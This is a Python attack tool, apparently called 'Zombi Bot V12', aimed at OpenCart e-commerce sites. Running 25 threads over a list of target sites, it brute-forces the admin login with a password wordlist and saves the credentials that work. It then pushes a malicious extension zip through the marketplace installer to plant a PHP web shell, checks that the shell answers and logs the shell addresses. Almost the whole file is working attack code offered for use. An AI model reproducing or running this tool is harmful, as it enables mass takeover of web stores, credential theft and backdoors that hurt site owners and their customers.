import os,sys,random,requests,time
from multiprocessing.dummy import Pool
from colorama import *

init()

la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'
def print_logo():
    clear = "\x1b[0m"
    colors = [ 2 ,2 ,2 ,2]

    x = """


 
  ______               _     _   ____        _    __      ____ ___  
 |___  /              | |   (_) |  _ \      | |   \ \    / /_ |__ \ 
    / / ___  _ __ ___ | |__  _  | |_) | ___ | |_   \ \  / / | |  ) |
   / / / _ \| '_ ` _ \| '_ \| | |  _ < / _ \| __|   \ \/ /  | | / / 
  / /_| (_) | | | | | | |_) | | | |_) | (_) | |_     \  /   | |/ /_ 
 /_____\___/|_| |_| |_|_.__/|_| |____/ \___/ \__|     \/    |_|____|                                                                      
 Zombi Bot V12    |   Ultra Priv8 Bot    | |  Code by Viper1337                           
                                             
                      
 [+] ICQ: 744289868
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)



print_logo()
def login(site):
  try:
    ov=open('Result/Shell.txt','a')
    cr=open('Result/OpenCart-V.2x','a')
    fd=open('File/Password.txt','r')
    for line in fd.readlines():
      passwd = line.strip()
      #print passwd
      cookies = {
          'OCSESSID': '41793cc49288925a72df1b7b5c',
          'language': 'en-gb',
          'currency': 'IDR',
      }

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Origin': 'https://arthajaya.id',
          'Upgrade-Insecure-Requests': '1',
          'Content-Type':'application/x-www-form-urlencoded', #'multipart/form-data;boundary=----WebKitFormBoundaryd4craIJOpv0eVBkM',
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          #'Referer': 'https://arthajaya.id/admin/index.php?route=common/login',
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept-Language': 'en-US,en;q=0.9',
      }

      params = (
          ('route', 'common/login'),
      )

      data = {
          'username': 'admin',
          'password': passwd
        }
      r = requests.get(site + "/admin/index.php",timeout=30)
      if "https://" in r.url:
          site = site.replace("http://","https://")
      else:
          pass
      s = requests.Session()
      r = s.post(site+'/admin/index.php', cookies=cookies, data=data,timeout=30)
      #print (r.text)
      #print r.text
      if 'common/logout' in r.text:
        print la5dhar+'[+] Upload Shell Manual ==> '+site+'|admin|'+passwd+labyadh
        cr.write(site+'|admin|'+passwd+'\n')
        x=r.text.split("token=")[1].split('" class="navbar-brand">')[0]
        if '&user_token' in r.text:
         url=site+'/admin/index.php?route=marketplace/installer/upload&user_token='+x
        else:
          url=site+'/admin/index.php?route=marketplace/installer/upload&token='+x
        headers = {
            'Origin': 'https://arthajaya.id',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://arthajaya.id/admin/index.php?route=marketplace/installer&user_token=G3DujT4TsvE3DdAs8YPKw7QoPBZ8hGPU',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
        }

        data = {'filename':'rsz.ocmod.zip','Content-Type':'application/zip'}
        fileName  =  'File/rsz.ocmod.zip' 
        FileDataBinary  =  open( fileName ,  'rb' ).read() 
        files  =  { 'file' :  ( fileName ,  FileDataBinary)}
        #print files
        #files  =  { 'file' :FileDataBinary}
        res = s.post(url, cookies=s.cookies,files=files)
        #print res.text
        nx=res.text.split('extension_install_id=')[1].split('"}')[0]
        st1=url.replace('marketplace/installer/upload','marketplace/install/install')+"&extension_install_id="+nx
        st2=st1.replace('marketplace/install/install','marketplace/install/unzip')
        st3=st1.replace('marketplace/install/install','marketplace/install/move')
        st4=st1.replace('marketplace/install/install','marketplace/install/xml')
        st5=st1.replace('marketplace/install/install','marketplace/install/remove')
        s.post(st1, cookies=s.cookies)
        s.post(st2, cookies=s.cookies)
        s.post(st3, cookies=s.cookies)
        s.post(st4, cookies=s.cookies)
        s.post(st5, cookies=s.cookies)
        sz=site+'/admin/controller/extension/extension/goblok.php'
        rt=requests.get(sz)
        if 'Uploader Izanami V 2.5' in rt.text:
          print lasfar+'[+] Upload Shell Succes ==> '+sz+labyadh
          ov.write(sz+'\n')
        break
      else:
        print '[+] Failed ==> '+site+'|admin|'+passwd
    return 0
  except:
    print ''
a=sys.argv[1]
ob = open(a,'r')
lists = ob.readlines()
list1 = []
i = 0
for i in range(len(lists)):
  list1.append(lists[i].strip('\n'))
count = 0

#try:
p = Pool(processes=25)
#pool = ThreadPool(25)
results = p.map(login,[site.rstrip() for site in (list1)])
#except:
 # pass
"""
for site in (list1):
 ur = site.rstrip() 
 try:
    login(ur)
 except:
    pass"""